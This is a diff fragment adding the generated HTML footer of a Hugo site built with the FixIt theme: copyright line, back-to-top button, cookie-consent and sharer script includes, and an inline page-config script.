+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.141.0">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.16">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">xiaole</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":1000},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"version":"v0.3.16"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
